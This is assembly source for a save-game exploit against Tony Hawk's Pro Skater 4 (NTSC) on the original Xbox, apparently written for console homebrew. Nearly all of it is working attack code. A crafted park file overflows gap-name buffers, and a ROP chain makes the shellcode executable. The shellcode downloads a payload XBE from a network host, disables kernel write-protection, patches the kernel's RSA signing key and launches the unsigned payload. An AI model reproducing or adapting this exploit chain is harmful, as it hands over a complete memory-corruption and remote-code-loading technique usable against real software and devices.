; Description: Save game exploit for Tony Hawk's Pro Skater 4 (NTSC)
; Author: Grimdoomer
;
; The NTSC xbe has the following timestamps:
;
; Image timestamp                     : 0x3D8BCCCA Fri Sep 20 18:35:06 2002
; PE timestamp                        : 0x3D8BCCC1 Fri Sep 20 18:34:57 2002
; Certificate timestamp               : 0x3D921A15 Wed Sep 25 13:18:29 2002
; Allowed game regions                : 0x00000001
;                                     : XBE_REGION_US_CANADA

		BITS 32

; Macros
%macro HACK_FUNCTION 1
	%define %1			CompressedMapBufferAddress + (_%1 - _buffer_overflow_start) + 1872
%endmacro

%macro HACK_DATA 1
	%define %1			CompressedMapBufferAddress + (_%1 - _buffer_overflow_start) + 1872
%endmacro

; ROP chain data
%define CompressedMapBufferAddress		823522b0h	; Address of CParkManager::mp_compressed_map_buffer buffer
%define ROPGadget0						000FAB61h	; pop esp # and al, 8 # mov [ecx], edx # pop esi # retn 4
%define ROPGadget1						000FB313h	; pop esp # ret
%define ROPGadget2						0002B1E9h	; pop eax # ret
%define ROPGadget3						0018BB42h	; mov [eax], esi # pop esi # ret
%define ROPGadget4						0018DFC5h	; pop ecx # ret
%define ROPGadget5						000E6EC0h	; mov eax, [ecx] # ret
%define ROPGadget6						00111166h	; call eax # test eax, eax # pop ecx # jz loc_b # xor eax, eax # inc eax # ret # xor eax, eax # ret

; Data needed to correct the stack when we return to game.
;%define _OldStackPtr					0d00489d0h	; 0d002e9d0h (DEBUG)	; ESP as we enter CParkManager::read_from_compressed_map_buffer
%define _OldReturnAddress				000ed1b6h	; Old return address we overwrote during the buffer overflow
%define _OldStackESI					8234cc60h	; Value of ESI stack var that was overwritten with the stack pivot address

; Function addresses
%define CreateFileA						00101549h
%define WriteFile						0010109Dh
%define CloseHandle						00101459h
%define NtAllocateVirtualMemory			0018E968h
%define XapiSelectCachePartition		00102F82h
%define snprintf						0010E7D6h

; Ed::CParkManager
%define Ed__CParkManager__Initialize	000ED3F0h

; GameNet::Manager
%define g_GameNet_Manager_Instance		0027D2CCh	; GameNet::Manager::Instance() singleton pointer

; Mem::Manager
%define Mem__Manager__Delete			000F7630h

; Net::Dispatcher
%define Net__Dispatcher__AddHandler		0002F8B0h

; Net::Client
%define	Net__Client__EnqueueMessageToServer		0002F2B0h

HACK_FUNCTION Hack_s_handle_payload_data
HACK_FUNCTION Hack_handle_stream_messages_hook

HACK_DATA Hack_PayloadFileName
HACK_DATA Hack_PayloadFileHandle
HACK_DATA Hack_PayloadFileSize
HACK_DATA Hack_PayloadDownloadSize
HACK_DATA Hack_OldStackPointer
HACK_DATA Hack_CacheDriveFormatString

HACK_DATA Hack_KernelImports
HACK_DATA HalReturnToFirmware
HACK_DATA LaunchDataPage
HACK_DATA MmAllocateContiguousMemory
HACK_DATA MmPersistContiguousMemory
HACK_DATA XePublicKeyData
HACK_DATA HalWriteSMBusValue

; Custom message IDs
%define MSG_ID_PAYLOAD_REQUEST			200
%define MSG_ID_PAYLOAD_DATA				201

%define PAYLOAD_MSG_ID_START			0	; Value = size of the file
%define PAYLOAD_MSG_ID_DATA				1	; C->H: Value = offset of data H->C Value = size of data
%define PAYLOAD_MSG_ID_END				2	; Value = size of data

; struct PayloadData
; {
;		DWORD Id;			; Message ID
;		DWORD Value;		; optional value, can be file size or offset of data depending on the message
; };

;---------------------------------------------------------
; Adjust the number of gaps in the park file to accomodate the double overflow
;---------------------------------------------------------
dd		0x4E
dd		(_gap_count_adjust_end - _gap_count_adjust_start)

_gap_count_adjust_start:

		; Set the number of gaps to 5.
		db	5

_gap_count_adjust_end

;---------------------------------------------------------
; Gap name buffer overflow
;---------------------------------------------------------
dd		0x78C
dd		(_buffer_overflow_end - _buffer_overflow_start)

_buffer_overflow_start:

		; +0 Start of gap #1 struct.
		db 0x15, 0x15
		db 0x08, 0x08, 0x18, 0x16
		db 0x01, 0x01, 0x31, 0x03

		; +10 Fill the gap name buffer with crap data.
		times 34 db 69h

		; +44 start of gap #2 struct.
		db 0x15, 0x15
		db 0x08, 0x08, 0x18, 0x16
		db 0x01, 0x01, 0x31, 0x03

		; +54 Stack pivot address
		dd 69696969h
		dd 69696969h
		dd 69696969h
		dd CompressedMapBufferAddress + 1872 + (stack_pivot - _buffer_overflow_start)

		; +66 gap 2 struct continued
		times 18 db 0

		; +88 start of gap #3 struct
		db 0x15, 0x15
		db 0x08, 0x08, 0x18, 0x16
		db 0x01, 0x01, 0x31, 0x03

		; +98 Fill the gap name buffer with crap data
		times 34 db 69h

		; +132 start of gap #4 struct.
		db 0x15, 0x15
		db 0x08, 0x08, 0x18, 0x16
		db 0x01, 0x01, 0x31, 0x03

		; +142 return address, points to ROPGadget1
		dd 69696969h
		dd ROPGadget1

		; +150 gap 4 struct continued
		times 26 db 0

		; +176 start of gap #5 struct.
		db 0x15, 0x15
		db 0x08, 0x08, 0x18, 0x16
		db 0x01, 0x01, 0x31, 0x03

		; +186 fill the gap name buffer with crap data
		times 44 db 69h

		; +230 return address, points to ROPGadget0
		dd ROPGadget0

;---------------------------------------------------------
; ROP chain data
;---------------------------------------------------------

		; Gadget 0 - save old stack pointer
			; push	esp
			; and	al, 8
			; mov	[ecx], edx
			; pop	esi
			; retn	4

		; Gadget 1 - stack pivot
			; pop	esp
			; ret
stack_pivot:
			dd		ROPGadget2		; Next gadget address

		; Gadget 2 - get address to save stack pointer to
			; pop	eax				; Hack_OldStackPointer
			; ret
			dd		Hack_OldStackPointer	; Location in park file to save stack pointer to
			dd		ROPGadget3		; Next gadget address

		; Gadget 3 - save old stack pointer for later
			; mov	[eax], esi		; Save stack pointer
			; pop	esi
			; ret
			dd		0				; esi
			dd		ROPGadget4		; Next gadget address

		; Gadget 4 - load pointer to NtAllocateVirtualMemory
			; pop	ecx				; ds:NtAllocateVirtualMemory
			; ret
			dd		NtAllocateVirtualMemory
			dd		ROPGadget5		; Next gadget address

		; Gadget 5 - get function address for NtAllocateVirtualMemory
			; mov	eax, [ecx]
			; ret
			dd		ROPGadget6		; Next gadget address

		; Gadget 6 - make shell code executable, jump to shell code
			; call	eax				; Make shell code executable
			; test	eax, eax
			; pop	ecx
			; jz	loc_b
			;    xor	eax, eax
			;    inc	eax
			;    ret				; Return to shell code
			;loc_b:
			; xor	eax, eax
			; ret					; Return to shell code
			dd		CompressedMapBufferAddress + 1872 + (_stack_address_ptr - _buffer_overflow_start)	; Pointer to allocation address
			dd		0								; NULL
			dd		CompressedMapBufferAddress + 1872 + (_stack_size_ptr - _buffer_overflow_start)		; Pointer to size of allocation
			dd		1000h							; MEM_COMMIT
			dd		40h								; PAGE_EXECUTE_READWRITE
			dd		0								; ecx
			dd		CompressedMapBufferAddress + 1872 + (shell_code_start - _buffer_overflow_start)	; Shell code address

_stack_address_ptr:
			dd		CompressedMapBufferAddress		; mp_compressed_map_buffer address

_stack_size_ptr:
			dd		15000							; Size of the mp_compressed_map_buffer buffer
			

;---------------------------------------------------------
; Main exploit shellcode
;---------------------------------------------------------

; Exploit entry point
shell_code_start:

		; Restore the old stack pointer.
		mov		esp, dword [Hack_OldStackPointer]
		sub		esp, 4

		; Fix the stack data we trashed with the buffer overflow and ROP chain.
		mov		dword [esp], _OldReturnAddress		; Correct the return address
		mov		dword [esp+4], _OldStackESI			; Correct the saved ESI value
		mov		dword [esp+8], 0					; Correct the saved EBX value
		mov		dword [esp+0Ch], 000ED5DBh			; Correct return address for calling function

		; Disable write protect.
		;cli							; Disable interrupts
		;mov		eax, cr0			; Get the control register value
		;and		eax, 0FFFEFFFFh		; Disable write-protect
		;mov		cr0, eax

		; Call the main exploit function.
		call	Hack_ExploitMain

		; Return execution to the game and pray.
		mov		esi, _OldStackESI					; Restore ESI
		ret

		align 4, db 0

		;---------------------------------------------------------
		; void ExploitMain() -> hook game code, request payload from server
		;---------------------------------------------------------
Hack_ExploitMain:

		%define StackSize		0Ch
		%define StackStart		0h

		; Setup stack frame.
		sub		esp, StackStart
		push	edx
		push	esi
		push	ecx

		;jmp		test_jump

		; Hook App::handle_stream_messages so we can fix the memory leak with network messages.
		push	Hack_handle_stream_messages_hook		; Detour
		push	000302DDh								; Hook address
		call	Hack_InstallHook

		; Get the GameNet::Manager instance.
		mov		edx, [g_GameNet_Manager_Instance]		; GameNet::Manager::Instance()

		; Get the client instance for player 0.
		mov		ecx, [edx+24h]							; pManager->m_client[0]

		; Add our message handler for MSG_ID_PAYLOAD_DATA.
		push	255										; HIGHEST_PRIORITY
		push	edx										; Net::Manager*
		push	0										; flags
		push	Hack_s_handle_payload_data				; Handler function address
		push	MSG_ID_PAYLOAD_DATA						; Message ID
		add		ecx, 0Ch								; m_client[0]->m_Dispatcher this ptr
		mov		eax, Net__Dispatcher__AddHandler
		call	eax										; pManager->m_client[0]->m_Dispatcher.AddHandler(MSG_ID_PAYLOAD_DATA, Hack_s_handle_payload_data, NULL, pManager, HIGHEST_PRIORITY);

		; Send the MSG_ID_PAYLOAD_REQUEST message to the server.
		xor		eax, eax
		push	eax										; delay?
		push	eax										; singular?
		push	8										; vSEQ_GROUP_PLAYER_MSGS
		push	0										; QUEUE_DEFAULT
		push	80h										; NORMAL_PRIORITY
		push	eax										; message data
		push	eax										; size of message data
		push	MSG_ID_PAYLOAD_REQUEST					; message id
		mov		edx, [g_GameNet_Manager_Instance]		; GameNet::Manager::Instance()
		mov		ecx, [edx+24h]							; pManager->m_client[0] (this ptr)
		mov		eax, Net__Client__EnqueueMessageToServer
		call	eax										; pManager->m_client[0]->EnqueueMessageToServer(MSG_ID_PAYLOAD_REQUEST, NULL, NULL, NORMAL_PRIORITY, QUEUE_DEFAULT, vSEQ_GROUP_PLAYER_MSGS, NULL, NULL);

test_jump:
		; Resolve kernel imports.
		call	Hack_ResolveKernelImports

		; Turn the console LED off so the user knows the exploit has started.
		push	0
		call	Hack_SetLEDColor

		; Destroy stack frame and return.
		pop		ecx
		pop		esi
		pop		edx
		add		esp, StackStart
		ret

		align 4, db 0

		%undef StackStart
		%undef StackSize

		;---------------------------------------------------------
		; App::handle_stream_messages_hook -> Fix memory leak in the network code
		;---------------------------------------------------------
_Hack_handle_stream_messages_hook:

		; Get the stream link pointers.
		mov		edi, dword [esp+10h]		; str_link
		mov		ecx, dword [edi+14h]		; str_link->m_Desc
		cmp		ecx, 0
		jz		_Hack_handle_stream_messages_hook_done

		; Free the message buffer.
		mov		eax, dword [ecx+2Ch]		; str_link->m_Desc->m_Data
		push	eax
		mov		ecx, 2D09E4h				; memory manager this ptr?
		mov		eax, Mem__Manager__Delete
		call	eax							; Mem__Manager__Delete(str_link->m_Desc->m_Data);

_Hack_handle_stream_messages_hook_done:
		; Get the message description pointer.
		mov		edi, dword [esp+10h]		; str_link
		mov		ecx, dword [edi+14h]		; str_link->m_Desc

		; Jump back into the function.
		push	000302E4h
		ret

		;---------------------------------------------------------
		; int __cdecl Hack_s_handle_payload_data(Net::MsgHandlerContext* context) -> Message handler for MSG_ID_PAYLOAD_DATA
		;---------------------------------------------------------
_Hack_s_handle_payload_data:

		%define StackSize		20h
		%define StackStart		0Ch
		%define Msg_Id			-0Ch
		%define Msg_Value		-8h
		%define BytesWritten	-4h
		%define context			4h

		; Setup stack frame.
		sub		esp, StackStart
		push	ebx
		push	ecx
		push	edx
		push	edi
		push	esi

		; Check if the file handle for the payload has already been created.
		cmp		dword [Hack_PayloadFileHandle], 0	; if (Hack_PayloadFileHandle == 0)
		jnz		_Hack_s_handle_payload_data_write

			; Set the LED color to orange to signal the payload is being received.
			push	0FFh
			call	Hack_SetLEDColor

			; Create the payload file in the cache drive.
			push	0						; hTemplate = NULL
			push	80h						; FILE_ATTRIBUTE_NORMAL
			push	2						; CREATE_ALWAYS
			push	0						; lpSecurityAttributes = NULL
			push	0						; no file share
			push	40000000h				; GENERIC_WRITE
			push	Hack_PayloadFileName	; file name
			mov		eax, CreateFileA
			call	eax						; hFileHandle = CreateFileA("Z:\\payload.xbe", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			cmp		eax, 0FFFFFFFFh			; if (hFileHandle == INVALID_HANDLE_VALUE)
			jz		_Hack_s_handle_payload_data_fail

			; Save the handle for later.
			mov		[Hack_PayloadFileHandle], eax

			; Save the payload file size.
			mov		eax, [esp+StackSize+context]
			mov		eax, dword [eax+4]
			mov		dword [Hack_PayloadFileSize], eax

			; There is no data in the start message, send the reply asking for data.
			jmp		_Hack_s_handle_payload_data_next

_Hack_s_handle_payload_data_write:
		; Write the payload contents to file.
		mov		ecx, [esp+StackSize+context]
		lea		eax, [esp+StackSize+BytesWritten]
		push	0									; lpOverlapped = NULL
		push	eax									; &BytesWritten
		mov		eax, dword [ecx+4]
		push	eax									; context->Value (size of chunk)
		lea		eax, [ecx+8]
		push	eax									; context->m_Msg + 8
		push	dword [Hack_PayloadFileHandle]			; file handle
		mov		eax, WriteFile
		call	eax									; result = WriteFile(Hack_PayloadFileHandle, context->m_Msg, context->m_MsgLength, &BytesWritten, NULL);
		test	eax, eax							; if (result != FALSE)
		jnz		_Hack_s_handle_payload_data_continue

		; Failed to write payload file, change LED color to red.
		push	0F0h
		call	Hack_SetLEDColor

_Hack_s_handle_payload_data_fail:
		nop
		jmp		_Hack_s_handle_payload_data_fail

_Hack_s_handle_payload_data_continue:
		; Update how much data we have downloaded.
		mov		eax, dword [esp+StackSize+BytesWritten]
		add		dword [Hack_PayloadDownloadSize], eax

		; Check if this chunk was the end of the payload file.
		mov		ecx, [esp+StackSize+context]
		cmp		dword [ecx], PAYLOAD_MSG_ID_END		; if (pMsg->Id == PAYLOAD_MSG_ID_END)
		jnz		_Hack_s_handle_payload_data_next

			;db 0CCh

			; Close the file handle.
			push	dword [Hack_PayloadFileHandle]
			mov		eax, CloseHandle
			call	eax						; CloseHandle(hFileHandle);

			; Patch the kernel RSA key with the habibi key pair.
			call	Hack_PatchHabibiKey

			; Set the LED color to green to signal the payload was successfully received.
			push	0Fh
			call	Hack_SetLEDColor

			; Execute the payload.
			call	Hack_LoadXbe

_Hack_s_handle_payload_data_next:
		; Setup the reply message to host.
		mov		dword [esp+StackSize+Msg_Id], PAYLOAD_MSG_ID_DATA	; ReplyMsg.Id = PAYLOAD_MSG_ID_DATA
		mov		eax, dword [Hack_PayloadDownloadSize]
		mov		dword [esp+StackSize+Msg_Value], eax				; ReplyMsg.Value = Hack_PayloadDownloadSize
		
		; Send the MSG_ID_PAYLOAD_DATA reply message to the host.
		xor		eax, eax
		lea		edx, [esp+StackSize+Msg_Id]
		push	eax											; delay?
		push	eax											; singular?
		push	8											; vSEQ_GROUP_PLAYER_MSGS
		push	0											; QUEUE_DEFAULT
		push	80h											; NORMAL_PRIORITY
		push	edx											; &ReplyMsg
		push	8											; sizeof(ReplyMsg)
		push	MSG_ID_PAYLOAD_DATA							; message id
		mov		edx, [g_GameNet_Manager_Instance]			; GameNet::Manager::Instance()
		mov		ecx, [edx+24h]								; pManager->m_client[0] (this ptr)
		mov		eax, Net__Client__EnqueueMessageToServer
		call	eax											; pManager->m_client[0]->EnqueueMessageToServer(MSG_ID_PAYLOAD_DATA, sizeof(ReplyMsg), &ReplyMsg, NORMAL_PRIORITY, QUEUE_DEFAULT, vSEQ_GROUP_PLAYER_MSGS, NULL, NULL);

		; Destroy stack frame and return.
		mov		eax, 3					; return HANDLER_MSG_CONTINUE
		pop		esi
		pop		edi
		pop		edx
		pop		ecx
		pop		ebx
		add		esp, StackStart
		ret

		align 4, db 0

		%undef BytesWritten
		%undef Msg_Value
		%undef Msg_Id
		%undef StackStart
		%undef StackSize

		;---------------------------------------------------------
		; void ResolveKernelImports() -> resolves new kernel imports
		;---------------------------------------------------------
Hack_ResolveKernelImports:

		%define StackSize		14h
		%define StackStart		0h

		; Setup the stack frame.
		sub		esp, StackStart
		push	ebx
		push	ecx
		push	edx
		push	esi
		push	edi

		; Get the address of the kernel export table
		mov		esi, 80010000h		; base kernel address
		mov		eax, [esi+3Ch]		; offset of PE header
		mov		ebx, [esi+eax+78h]	; offset of the exports segment
		add		ebx, esi			; add kernel base address
		mov		edx, [ebx+1Ch]		; offset of the exports table
		add		edx, esi			; address of the exports table

		; Get the address of our "import" table
		mov		edi, Hack_KernelImports

resolve_import:
		; Load the next import index and check if it is valid
		mov		ecx, [edi]
		test	ecx, ecx
		jz		_ResolveKernelImportsDone

		; Load the function address from the export table
		sub		ecx, [ebx+10h]		; Subtract the base export number
		mov		eax, [edx+4*ecx]	; Load the function offset from the export table
		test	eax, eax
		jz		_empty
		add		eax, esi			; Add the kernel base address to the function offset
_empty:
		mov		[edi], eax

		; Next import
		add		edi, 4
		jmp		resolve_import

_ResolveKernelImportsDone:
		; Destroy the stack frame and return.
		pop		edi
		pop		esi
		pop		edx
		pop		ecx
		pop		ebx
		add		esp, StackStart
		ret

		align 4, db 0

		%undef StackStart
		%undef StackSize

		;---------------------------------------------------------
		; void Hack_PatchRSAKey() -> Patch the RSA public key in kernel to the habibi public key
		;---------------------------------------------------------
Hack_PatchHabibiKey:

		%define StackSize		8h
		%define StackStart		0h

		; Setup the stack frame.
		sub		esp, StackStart
		push	ecx
		push	edi

		; Get the address of the RSA public key.
		mov		edi, [XePublicKeyData]		; Address to start searching at
		test	edi, edi
		jz		patch_rsa_fail

		; Check the last 4 bytes for the retail key.
		add		edi, 272
		cmp		dword [edi], 0A44B1BBDh
		je		patch_rsa

patch_rsa_fail:
		; The data was never found, change the LED color and loop forever.
		push	0F0h
		call	Hack_SetLEDColor

		; Just loop forever.
shit_loop:
		nop
		jmp		shit_loop

patch_rsa:
		; Disable write protect.
		pushf
		cli							; Disable interrupts
		mov		ecx, cr0			; Get the control register value
		push	ecx					; Save it for later
		and		ecx, 0FFFEFFFFh		; Disable write-protect
		mov		cr0, ecx

		; Patch the RSA key to the habibi key.
		xor		dword [edi], 2DD78BD6h

		; Re-enable write-protect.
		pop		ecx
		mov		cr0, ecx			; Re-enable write-protect
		popf

		; Destroy the stack frame and return.
		pop		edi
		pop		ecx
		add		esp, StackStart
		ret

		align 4, db 0

		%undef StackStart
		%undef StackSize

		;---------------------------------------------------------
		; void Hack_LoadXbe() -> Launches the payload xbe
		;---------------------------------------------------------
Hack_LoadXbe:

		%define StackSize		18h
		%define StackStart		8h
		%define CachePartition	-8h
		%define ForceFormat		-4h

		; Setup the stack frame.
		sub		esp, StackStart
		push	ebx
		push	ecx
		push	esi
		push	edi

		;db 0CCh

		; Get the partition index of the Z cache drive.
		lea		eax, [esp+StackSize+ForceFormat]
		lea		ebx, [esp+StackSize+CachePartition]
		push	eax										; &ForceFormat
		push	ebx										; &CachePartition
		push	0										; FALSE
		mov		eax, XapiSelectCachePartition
		call	eax

		; Load the launch data page address from the kernel and check if it is valid.
		mov		esi, [LaunchDataPage]
		mov		edi, 1000h			; Size of the memory region to allocate/persist
		mov		ebx, [esi]			; Load the launch data page address
		test	ebx, ebx			; Check if it is valid
		jnz		memok

		; The launch data page is invalid, allocate a new buffer
		push	edi					; Page size to allocate
		call	dword [MmAllocateContiguousMemory]
		mov		ebx, eax
		mov		[esi], eax			; Store the address into the kernel LaunchDataPage holder

memok:
		; Make the memory persistant
		push	byte 1
		push	edi					; Size of memory block
		push	ebx					; Address of memory block
		call	dword [MmPersistContiguousMemory]

		; Zero out the data block
		mov		edi, ebx
		xor		eax, eax
		mov		ecx, 400h
		rep		stosd

		; Setup the launch data parameters
		or		dword [ebx], byte -1

		; Format the payload file path using the cache partition index we got earlier.
		mov		eax, [esp+StackSize+CachePartition]
		push	eax								; Cache drive partition index
		push	Hack_CacheDriveFormatString		; '\Device\Harddisk0\Partition%d;payload.xbe'
		push	256								; 256 characters max
		lea		edi, [ebx+8]					; Address of the launch string buffer
		push	edi
		mov		eax, snprintf
		call	eax

		; Launch the xbe
		push	byte 2
		call	dword [HalReturnToFirmware]

		; We will never get here, but, destroy the stack frame and return.
		int		3
		pop		edi
		pop		esi
		pop		ecx
		pop		edx
		add		esp, StackStart

		align 4, db 0

		%undef FileName
		%undef ForceFormat
		%undef CachePartition
		%undef StackStart
		%undef StacKSize

		;---------------------------------------------------------
		; void Hack_SetLEDColor(int color) -> Changes the console's LED color
		;---------------------------------------------------------
Hack_SetLEDColor:
		; Initialize the stack.
		push	ebp

		; Change the LED color.
		push	dword [esp+8]	; color
		push	0				; write word value
		push	8				; command code
		push	20h				; device address
		call	dword [HalWriteSMBusValue]

		; Flush something idk
		push	1		; value
		push	0		; write word value
		push	7		; command
		push	20h		; slave address
		call	dword [HalWriteSMBusValue]

		; Destroy the stack frame.
		pop		ebp
		retn	4

		align 4, db 0

		;---------------------------------------------------------
		; void InstallHook(void *Address, void *Detour) -> Hooks at the specified address
		;---------------------------------------------------------
Hack_InstallHook:

		%define StackSize		14h
		%define StackStart		8h
		%define ShellCode		-8
		%define Address			4h
		%define Detour			8h

		; Setup the stack frame.
		sub		esp, StackStart
		push	ecx
		push	edi
		push	esi

		; Setup the shellcode buffer.
		;	push	Address
		;	ret
		lea		esi, [esp+StackSize+ShellCode]
		mov		byte [esi], 68h
		mov		eax, dword [esp+StackSize+Detour]
		mov		dword [esi+1], eax
		mov		byte [esi+5], 0C3h

		; Setup for the memcpy operation.
		mov		edi, dword [esp+StackSize+Address]
		mov		ecx, 6

		; Disable write protect.
		pushf
		cli							; Disable interrupts
		mov		eax, cr0			; Get the control register value
		push	eax					; Save it for later
		and		eax, 0FFFEFFFFh		; Disable write-protect
		mov		cr0, eax

		; Copy the hook shellcode to the target address.
		cld
		rep		movsb

		; Re-enable write-protect.
		pop		eax
		mov		cr0, eax			; Re-enable write-protect
		popf

		; Destroy the stack frame and return.
		pop		esi
		pop		edi
		pop		ecx
		add		esp, StackStart
		ret		8

		align 4, db 0

		%undef Detour
		%undef Address
		%undef StackStart
		%undef StackSize

_Hack_KernelImports:
		_HalReturnToFirmware				dd 49
		_LaunchDataPage						dd 164
		_MmAllocateContiguousMemory			dd 165
		_MmPersistContiguousMemory			dd 178
		_XePublicKeyData					dd 355
		_HalWriteSMBusValue					dd 50
											dd 0

_Hack_PayloadFileName:
		db 'Z:\payload.xbe',0
		align 4, db 0

_Hack_PayloadFileHandle:
		dd 0

_Hack_PayloadFileSize:
		dd 0

_Hack_PayloadDownloadSize:
		dd 0

_Hack_OldStackPointer:
		dd 0

_Hack_CacheDriveFormatString:
		db '\Device\Harddisk0\Partition%d;payload.xbe',0
		align 4, db 0

_buffer_overflow_end:

;---------------------------------------------------------
; End of file
;---------------------------------------------------------
dd -1
end